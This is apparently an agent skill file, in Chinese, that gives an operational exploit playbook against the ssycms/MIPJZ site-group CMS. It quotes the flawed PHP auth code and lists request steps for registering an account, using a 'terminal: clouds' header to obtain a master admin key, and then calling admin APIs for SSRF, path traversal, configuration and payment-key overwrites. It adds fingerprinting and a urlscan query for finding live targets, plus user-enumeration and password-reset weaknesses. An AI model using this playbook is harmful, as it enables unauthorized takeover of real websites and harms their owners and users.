---
name: ssycms-mipjz-master-key
description: "Use when 目标疑似 ssycms/MIPJZ 站群 CMS: terminal:clouds 领万能 key."
version: 1.0.0
license: MIT
platforms: [linux]
---
# ssycms / MIPJZ 站群 CMS — 任意注册用户领 master key

源码级审计结论（2026-10-22，源：github.com/JeskoRecord/mipzhanqun，2,519 PHP / ThinkPHP 5）。
适用产品：MIPJZ / ssycms / mipcms 站群（`naples` 模板族，`/public/naples/plugins/lightbox` 静态资源是其指纹）。

## 1. 两个关键事实

### 1.1 AdminBase 万能 secret-key
`app/common/controller/AdminBase.php`：

```php
if (!$this->userId) {
    if (empty($header['secret-key'])) exit('无权限操作');
    if ($header['secret-key'] == db('AccessKey')->where('id',999)->find()['key']) {
        $passStatus = true;   // 全站后台 API 放行
    }
}
```
- `access_key` 表 **id=999** 一条记录 = 所有 `/setting/ApiAdmin*` 的万能钥匙
- 安装 SQL 只预置 id 1–5（固定值 `qFaLOmUGozsURROtxaAqe87vHSlI0LL1` 等，PC/WAP/APP/clouds），999 是运行时创建

### 1.2 任意登录用户都能领到 999 的 key
`app/user/controller/ApiUser.php::login`：

```php
session('userInfo',$session);
if ($header['terminal'] == 'clouds') {
    // 没有 group_id==1 校验！
    db('accessKey')->where('id',999)->update(['key'=>uuid(),'type'=>'clouds']); // 或 insert
    return jsonSuccess('', ['key'=>$key, 'siteInfo'=>config('siteInfo')]);
}
```
- 只要登录成功（`loginStatus` 开时任意用户组均可），**请求头 `terminal: clouds` 直接返回 master key + siteInfo**
- 注意：每次调用会**重置** key（uuid 重新签发），别重复调；拿到就用

## 2. 利用链（需要能访问到 CMS 本体，非静态前台）

```
1) POST /user/ApiUser/reg     username=&password=&rpassword=&__token__=   → 注册
   或 /index.php?s=user/ApiUser/reg
2) POST /user/ApiUser/login   username=&password=  Header: terminal: clouds
   → {"code":1,"data":{"key":"<uuid>","siteInfo":{...}}}
3) 后续所有后台 API：POST + Header: secret-key: <uuid>
   - /setting/ApiAdminTool/urlPost          postAddress=&urls=      → SSRF
   - /setting/ApiAdminTemplate/templateSave fileName=               → 模板名入库（可路径穿越）
   - /setting/ApiAdminSetting/settingSave                           → 全站配置写
   - /setting/ApiAdminDomainSites/itemAdd                           → 加站/域名
   - /setting/ApiAdminKey/keySave                                   → 改短信/支付 key
   - /article/ApiUserArticle/defaultImgUpload  post.key=<uuid>       → 图片上传（白名单 jpg/png/gif + 内容过滤 <?php、eval → 不能直落 shell）
```

## 3. 指纹与入口定位

- 前台特征：`/public/naples/plugins/lightbox`、`/ye.js`、`ajax-url?lanno=`、`index.php?s=`
- urlscan 查存量：`GET https://urlscan.io/api/v1/search/?q=filename:%22/public/naples/plugins/lightbox%22`（实测 127 域）
- **坑**：这些站群前台多为**静态 HTML 或 catch-all**（任意路径返回同一首页 81–110KB）
  `/user/ApiUser/*`、`/install/`、`/admin/` 全返回首页 → 必须先找到 CMS 真实入口（独立域/端口/随机后台路径）
- 判断 catch-all：同一 host 对 `/no_such_xxx` 与 `/index.php` 返回**完全相同长度**即静态或兜底，别再试路径
- 台群主控通常还有一个「云端/站群管理」域，`zhanqun` 表里存各子站 `link_key`（等价子站 master key）

## 4. 其他可用点（源码确认）

- `ApiUser::userVerification` — 手机号 → `用户不存在`，**未授权用户枚举 oracle**
- `ApiUser::userForget` — 改密只校验 `Cache::get('smsCode'.$mobile.md5(session_id()))`，与当前 session 绑定；能写 cache 即任意改密
- `ApiArticle`（extends Base）— 文章列表/详情未授权，`ApiUserArticleComments` 需 UserBase
- `setting/ApiSetting::itemInfo|status`（extends Controller，无鉴权）— 站点信息/状态

## Pitfalls
- `AdminBase` 要求 **POST**（`isPost()` 否则「非法请求」）
- `terminal: clouds` 只在 login 成功分支里；登录失败拿不到 key
- 拿 key 后每次请求都带 `secret-key`；`dataid` 头可切换子站上下文
- 上传端点用 `post.key`（不是 header），且会真做图片解码，非图片直接失败
